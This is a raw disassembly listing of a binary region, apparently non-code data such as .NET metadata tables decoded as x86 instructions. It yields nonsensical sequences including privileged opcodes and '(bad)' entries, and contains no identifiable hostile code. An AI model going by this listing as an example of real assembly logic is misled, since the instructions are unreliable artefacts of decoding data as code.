  405ccc:	55                   	push   %ebp
  405ccd:	00 06                	add    %al,(%esi)
  405ccf:	00 67 14             	add    %ah,0x14(%edi)
  405cd2:	5c                   	pop    %esp
  405cd3:	02 06                	add    (%esi),%al
  405cd5:	00 5f 0d             	add    %bl,0xd(%edi)
  405cd8:	5c                   	pop    %esp
  405cd9:	02 0a                	add    (%edx),%cl
  405cdb:	00 b1 06 3a 15 06    	add    %dh,0x6153a06(%ecx)
  405ce1:	00 2d 12 5c 02 0a    	add    %ch,0xa025c12
  405ce7:	00 cf                	add    %cl,%bh
  405ce9:	06                   	push   %es
  405cea:	3a 15 06 00 68 1d    	cmp    0x1d680006,%dl
  405cf0:	55                   	push   %ebp
  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 fc                	add    %bh,%ah
  405cf5:	16                   	push   %ss
  405cf6:	dc 02                	faddl  (%edx)
  405cf8:	06                   	push   %es
  405cf9:	00 2e                	add    %ch,(%esi)
  405cfb:	0e                   	push   %cs
  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 6c 06 5c          	add    %ch,0x5c(%esi,%eax,1)
  405d03:	02 06                	add    (%esi),%al
  405d05:	00 6d 0f             	add    %ch,0xf(%ebp)
  405d08:	5c                   	pop    %esp
  405d09:	02 06                	add    (%esi),%al
  405d0b:	00 02                	add    %al,(%edx)
  405d0d:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d12:	74 14                	je     0x405d28
  405d14:	5c                   	pop    %esp
  405d15:	02 06                	add    (%esi),%al
  405d17:	00 23                	add    %ah,(%ebx)
  405d19:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d1d:	00 3c 12             	add    %bh,(%edx,%edx,1)
  405d20:	5b                   	pop    %ebx
  405d21:	15 1a 00 f3 13       	adc    $0x13f3001a,%eax
  405d26:	7c 1a                	jl     0x405d42
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	78 11                	js     0x405d3d
  405d2c:	7c 1a                	jl     0x405d48
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	ac                   	lods   %ds:(%esi),%al
  405d31:	14 00                	adc    $0x0,%al
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 18                	add    %bl,(%eax)
  405d37:	19 7c 1a 06          	sbb    %edi,0x6(%edx,%ebx,1)
  405d3b:	00 33                	add    %dh,(%ebx)
  405d3d:	15 eb 0f 06 00       	adc    $0x60feb,%eax
  405d42:	7a 00                	jp     0x405d44
  405d44:	eb 0f                	jmp    0x405d55
  405d46:	06                   	push   %es
  405d47:	00 e2                	add    %ah,%dl
  405d49:	0f eb 0f             	por    (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 eb                	add    %ch,%bl
  405d51:	0f 06                	clts
  405d53:	00 db                	add    %bl,%bl
  405d55:	12 fe                	adc    %dh,%bh
  405d57:	1c 06                	sbb    $0x6,%al
  405d59:	00 2a                	add    %ch,(%edx)
  405d5b:	10 fe                	adc    %bh,%dh
  405d5d:	1c 06                	sbb    $0x6,%al
  405d5f:	00 a7 07 eb 0f 06    	add    %ah,0x60feb07(%edi)
  405d65:	00 7d 10             	add    %bh,0x10(%ebp)
  405d68:	eb 0f                	jmp    0x405d79
  405d6a:	1e                   	push   %ds
  405d6b:	00 21                	add    %ah,(%ecx)
  405d6d:	11 a3 17 06 00 9f    	adc    %esp,-0x60fff9e9(%ebx)
  405d73:	1d b5 0e 06 00       	sbb    $0x60eb5,%eax
  405d78:	cf                   	iret
  405d79:	0e                   	push   %cs
  405d7a:	b5 0e                	mov    $0xe,%ch
  405d7c:	06                   	push   %es
  405d7d:	00 7a 06             	add    %bh,0x6(%edx)
  405d80:	b5 0e                	mov    $0xe,%ch
  405d82:	06                   	push   %es
  405d83:	00 6f 03             	add    %ch,0x3(%edi)
  405d86:	eb 0f                	jmp    0x405d97
  405d88:	06                   	push   %es
  405d89:	00 1a                	add    %bl,(%edx)
  405d8b:	06                   	push   %es
  405d8c:	95                   	xchg   %eax,%ebp
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 0c 14             	add    %cl,(%esp,%edx,1)
  405d92:	55                   	push   %ebp
  405d93:	00 0a                	add    %cl,(%edx)
  405d95:	00 90 18 55 00 06    	add    %dl,0x6005518(%eax)
  405d9b:	00 d0                	add    %dl,%al
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	e9 14 00 00 12       	jmp    0x12405dbb
  405da7:	00 9d 05 b7 12 06    	add    %bl,0x612b705(%ebp)
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 c1                	add    %al,%cl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 af 10 eb 0f 06    	add    %ch,0x60feb10(%edi)
  405db9:	00 1b                	add    %bl,(%ebx)
  405dbb:	1d 4c 11 06 00       	sbb    $0x6114c,%eax
  405dc0:	33 08                	xor    (%eax),%ecx
  405dc2:	eb 0f                	jmp    0x405dd3
  405dc4:	06                   	push   %es
  405dc5:	00 f4                	add    %dh,%ah
  405dc7:	14 eb                	adc    $0xeb,%al
  405dc9:	0f 06                	clts
  405dcb:	00 f6                	add    %dh,%dh
  405dcd:	05 eb 0f 22 00       	add    $0x220feb,%eax
  405dd2:	49                   	dec    %ecx
  405dd3:	12 52 13             	adc    0x13(%edx),%dl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	ca 16 52             	lret   $0x5216
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 79 13             	add    %bh,0x13(%ecx)
  405de0:	52                   	push   %edx
  405de1:	13 12                	adc    (%edx),%edx
  405de3:	00 71 13             	add    %dh,0x13(%ecx)
  405de6:	98                   	cwtl
  405de7:	15 22 00 e2 16       	adc    $0x16e20022,%eax
  405dec:	52                   	push   %edx
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 52 16             	add    %dl,0x16(%edx)
  405df2:	fe                   	(bad)
  405df3:	1c 06                	sbb    $0x6,%al
  405df5:	00 e8                	add    %ch,%al
  405df7:	11 eb                	adc    %ebp,%ebx
  405df9:	0f 06                	clts
  405dfb:	00 59 16             	add    %bl,0x16(%ecx)
  405dfe:	fe                   	(bad)
  405dff:	1c 12                	sbb    $0x12,%al
  405e01:	00 0d 13 fe 1c 06    	add    %cl,0x61cfe13
  405e07:	00 a1 0f fe 1c 06    	add    %ah,0x61cfe0f(%ecx)
  405e0d:	00 fb                	add    %bh,%bl
  405e0f:	00 fe                	add    %bh,%dh
  405e11:	1c 06                	sbb    $0x6,%al
  405e13:	00 d2                	add    %dl,%dl
  405e15:	11 eb                	adc    %ebp,%ebx
  405e17:	0f 06                	clts
  405e19:	00 03                	add    %al,(%ebx)
  405e1b:	10 fe                	adc    %bh,%dh
  405e1d:	1c 06                	sbb    $0x6,%al
  405e1f:	00 47 05             	add    %al,0x5(%edi)
  405e22:	fe                   	(bad)
  405e23:	1c 06                	sbb    $0x6,%al
  405e25:	00 0b                	add    %cl,(%ebx)
  405e27:	05 fe 1c 06 00       	add    $0x61cfe,%eax
  405e2c:	44                   	inc    %esp
  405e2d:	10 fe                	adc    %bh,%dh
  405e2f:	1c 06                	sbb    $0x6,%al
  405e31:	00 26                	add    %ah,(%esi)
  405e33:	05 fe 1c 06 00       	add    $0x61cfe,%eax
  405e38:	bb 11 fe 1c 06       	mov    $0x61cfe11,%ebx
  405e3d:	00 9a 13 eb 0f 06    	add    %bl,0x60feb13(%edx)
  405e43:	00 91 1c eb 0f 06    	add    %dl,0x60feb1c(%ecx)
  405e49:	00 fc                	add    %bh,%ah
  405e4b:	17                   	pop    %ss
  405e4c:	98                   	cwtl
  405e4d:	15 06 00 d3 05       	adc    $0x5d30006,%eax
  405e52:	eb 0f                	jmp    0x405e63
  405e54:	06                   	push   %es
  405e55:	00 26                	add    %ah,(%esi)
  405e57:	03 fe                	add    %esi,%edi
  405e59:	1c 06                	sbb    $0x6,%al
  405e5b:	00 c7                	add    %al,%bh
  405e5d:	00 eb                	add    %ch,%bl
  405e5f:	0f 06                	clts
  405e61:	00 c1                	add    %al,%cl
  405e63:	05 eb 0f 06 00       	add    $0x60feb,%eax
  405e68:	3f                   	aas
  405e69:	06                   	push   %es
  405e6a:	eb 0f                	jmp    0x405e7b
  405e6c:	06                   	push   %es
  405e6d:	00 2b                	add    %ch,(%ebx)
  405e6f:	18 5c 02 06          	sbb    %bl,0x6(%edx,%eax,1)
  405e73:	00 38                	add    %bh,(%eax)
  405e75:	08 5c 02 0a          	or     %bl,0xa(%edx,%eax,1)
  405e79:	00 ae 0f 0b 11 0a    	add    %ch,0xa110b0f(%esi)
  405e7f:	00 37                	add    %dh,(%edi)
  405e81:	05 0b 11 00 00       	add    $0x110b,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	40                   	inc    %eax
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 c6                	add    %al,%dh
  405e97:	0f 75 1a             	pcmpeqw (%edx),%mm3
  405e9a:	05 00 01 00 01       	add    $0x1000100,%eax
  405e9f:	00 81 01 10 00 0e    	add    %al,0xe001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	75 1a                	jne    0x405ec2
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405eb3:	19 93 11 05 00 13    	sbb    %edx,0x13000511(%ebx)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 a9 12 03 0f 05    	add    %ch,0x50f0312(%ecx)
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	2e 17                	cs pop %ss
  405ed0:	32 14 05 00 1e 00 26 	xor    0x26001e00(,%eax,1),%dl
  405ed7:	00 81 01 10 00 85    	add    %al,-0x7affefff(%ecx)
  405edd:	10 32                	adc    %dh,(%edx)
  405edf:	14 05                	adc    $0x5,%al
  405ee1:	00 1e                	add    %bl,(%esi)
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 42 13             	add    %al,0x13(%edx)
  405eec:	32 14 05 00 1e 00 2f 	xor    0x2f001e00(,%eax,1),%dl
  405ef3:	00 81 01 10 00 53    	add    %al,0x53001001(%ecx)
  405ef9:	15 32 14 05 00       	adc    $0x51432,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 52    	add    %al,0x52001001(%ecx)
  405f07:	0f 32                	rdmsr
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 4d    	add    %al,0x4d001001(%ecx)
  405f15:	15 32 14 05 00       	adc    $0x51432,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 01                	add    %al,(%ecx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 93    	add    %al,-0x6cffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	32 14 05 00 23 00 3e 	xor    0x3e002300(,%eax,1),%dl
  405f39:	00 81 01 10 00 65    	add    %al,0x65001001(%ecx)
  405f3f:	1d 32 14 05 00       	sbb    $0x51432,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 8f    	add    %al,-0x70ffefff(%ecx)
  405f4d:	19 71 19             	sbb    %esi,0x19(%ecx)
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 f2 0f 05    	add    %cl,0x50ff201
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	f2 0f 05             	repnz syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 58 01             	add    %bl,0x1(%eax)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 98 17 bc 0d 05    	add    %bl,0x50dbc17(%eax)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 55 10             	add    %dl,0x10(%ebp)
  405fb0:	bc 0d 05 00 2f       	mov    $0x2f00050d,%esp
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	6b 1c bc 0d          	imul   $0xd,(%esp,%edi,4),%ebx
  405fc0:	05 00 31 00 63       	add    $0x63003100,%eax
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 d7                	add    %dl,%bh
  405fcb:	0d bc 0d 05 00       	or     $0x50dbc,%eax
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	0c 08                	or     $0x8,%al
  405fda:	bc 0d 39 00 3a       	mov    $0x3a00390d,%esp
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 83 17 bc 0d 05    	add    %al,0x50dbc17(%ebx)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 8d 17 bc 0d 05    	add    %cl,0x50dbc17(%ebp)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 83    	add    %al,-0x7cffefff(%ecx)
  406003:	12 bc 0d 05 00 47 00 	adc    0x470005(%ebp,%ecx,1),%bh
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 49 01             	add    %cl,0x1(%ecx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 9d 18 	add    %ah,0x189d0016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 aa 18 12 00 16    	add    %ch,0x16001218(%edx)
  406035:	00 03                	add    %al,(%ebx)
  406037:	11 12                	adc    %edx,(%edx)
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 0a                	add    %cl,(%edx)
  40603d:	0f 12 00             	movlps (%eax),%xmm0
  406040:	16                   	push   %ss
  406041:	00 34 13             	add    %dh,(%ebx,%edx,1)
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 46 06             	add    %al,0x6(%esi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 f5                	add    %dh,%ch
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406059:	00 9b 08 12 00 16    	add    %bl,0x16001208(%ebx)
  40605f:	00 4e 08             	add    %cl,0x8(%esi)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 95 08 15 00 16    	add    %dl,0x16001508(%ebp)
  40606b:	00 a0 0d 12 00 16    	add    %ah,0x1600120d(%eax)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 cb                	add    %cl,%bl
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 6b 02             	add    %ch,0x2(%ebx)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 74 03 12          	add    %dh,0x12(%ebx,%eax,1)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 4a 1c             	add    %cl,0x1c(%edx)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 a3 12 12 00 11    	add    %ah,0x11001212(%ebx)
  406095:	00 80 04 21 00 11    	add    %al,0x11002104(%eax)
  40609b:	00 65 04             	add    %ah,0x4(%ebp)
  40609e:	25 00 11 00 35       	and    $0x35001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 cb                	add    %cl,%bl
  4060a9:	03 2d 00 11 00 4d    	add    0x4d001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b0 03 30 00 11    	add    %dh,0x11003003(%eax)
  4060b9:	00 93 03 34 00 31    	add    %dl,0x31003403(%ebx)
  4060bf:	00 79 03             	add    %bh,0x3(%ecx)
  4060c2:	37                   	aaa
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 e7                	add    %ah,%bh
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 1b                	add    %bl,(%ebx)
  4060cd:	04 3a                	add    $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 fd                	add    %bh,%ch
  4060d3:	03 34 00             	add    (%eax,%eax,1),%esi
  4060d6:	16                   	push   %ss
  4060d7:	00 87 12 dc 00 06    	add    %al,0x600dc12(%edi)
  4060dd:	06                   	push   %es
  4060de:	9b                   	fwait
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	70 02                	jo     0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 ce 01             	or     $0x1,%dh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060f6:	fe 01                	incb   (%ecx)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 4c 17 30          	add    %cl,0x30(%edi,%edx,1)
  4060ff:	01 16                	add    %edx,(%esi)
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 92 0d 3a 00 51 80 	adcb   $0x80,0x51003a0d(%edx)
  40610e:	8e 0d 3a 00 51 80    	mov    0x8051003a,%cs
  406114:	85 0d 3a 00 51 80    	test   %ecx,0x8051003a
  40611a:	69 0d 3a 00 21 00 f9 	imul   $0x291cf9,0x21003a,%ecx
  406121:	1c 29 00 
  406124:	21 00                	and    %eax,(%eax)
  406126:	da 1c 29             	ficompl (%ecx,%ebp,1)
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 f1                	add    %dh,%cl
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 77 01             	add    %esi,0x1(%edi)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	5d                   	pop    %ebp
  406139:	05 8f 01 01 00       	add    $0x1018f,%eax
  40613e:	91                   	xchg   %eax,%ecx
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 b2 11 3a 00 01    	add    %dh,0x1003a11(%edx)
  406149:	00 91 10 30 01 01    	add    %dl,0x1013010(%ecx)
  40614f:	00 2c 14             	add    %ch,(%esp,%edx,1)
  406152:	c7 01 01 00 a2 07    	movl   $0x7a20001,(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	82 07 12             	addb   $0x12,(%edi)
  40615f:	00 01                	add    %al,(%ecx)
  406161:	00 a4 0a 37 00 01 00 	add    %ah,0x10037(%edx,%ecx,1)
  406168:	02 08                	add    (%eax),%cl
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	9a 1a c7 01 01 00 91 	lcall  $0x9100,$0x101c71a
  406175:	10 30                	adc    %dh,(%eax)
  406177:	01 01                	add    %eax,(%ecx)
  406179:	00 8c 1c 06 02 06 06 	add    %cl,0x6060206(%esp,%ebx,1)
  406180:	9b                   	fwait
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	fa                   	cli
  406187:	11 02                	adc    %eax,(%edx)
  406189:	02 56 80             	add    -0x80(%esi),%dl
  40618c:	4d                   	dec    %ebp
  40618d:	0f 02 02             	lar    (%edx),%eax
  406190:	56                   	push   %esi
  406191:	80 72 12 02          	xorb   $0x2,0x12(%edx)
  406195:	02 56 80             	add    -0x80(%esi),%dl
  406198:	91                   	xchg   %eax,%ecx
  406199:	1c 02                	sbb    $0x2,%al
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	c0 0c 02 02          	rorb   $0x2,(%edx,%eax,1)
  4061a2:	56                   	push   %esi
  4061a3:	80 dc 13             	sbb    $0x13,%ah
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	07                   	pop    %es
  4061b7:	19 02                	sbb    %eax,(%edx)
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	3f                   	aas
  4061bd:	06                   	push   %es
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 a7 07 02 02 56 80 	andb   $0x80,0x56020207(%edi)
  4061c8:	4a                   	dec    %edx
  4061c9:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061ce:	11 02                	adc    %eax,(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 9a 10 0a 00 01    	add    %bl,0x1000a10(%edx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	fe                   	(bad)
  4061e9:	14 0e                	adc    $0xe,%al
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 04 17             	add    %al,(%edi,%edx,1)
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 34 0d 1d    	add    %dl,0x1d0d3400(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 04 15 0a    	add    %dl,0xa150418(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 4b 1a 3d    	add    %dl,0x3d1a4b08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 59 1a 42    	add    %dl,0x421a5908(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 2f 1a 48    	add    %dl,0x481a2f08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 3d 1a 4d    	add    %dl,0x4d1a3d08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 8b 13 53    	add    %dl,0x53138b08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 96 13 58    	add    %dl,0x58139608(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 13 0b 5e    	add    %dl,0x5e0b1308(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 22                	or     %ah,(%edx)
  406283:	0b 62 00             	or     0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 c8 19 5e    	add    %dl,0x5e19c808(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 d3 19 62    	add    %dl,0x6219d308(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 c7 0a 67    	add    %dl,0x670ac708(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 d5 0a 6c    	add    %dl,0x6c0ad508(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 42 03 1d    	add    %dl,0x1d034208(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 52 03 72    	add    %dl,0x72035208(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 f2 02 77    	add    %dl,0x7702f208(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 83 0b 67    	add    %dl,0x670b8308(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 8c 0b 6c    	add    %dl,0x6c0b8c08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 e9 0e 7b    	add    %dl,0x7b0ee908(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 f6 0e 7f    	add    %dl,0x7f0ef608(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e0 0c 1d    	add    %dl,0x1d0ce008(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
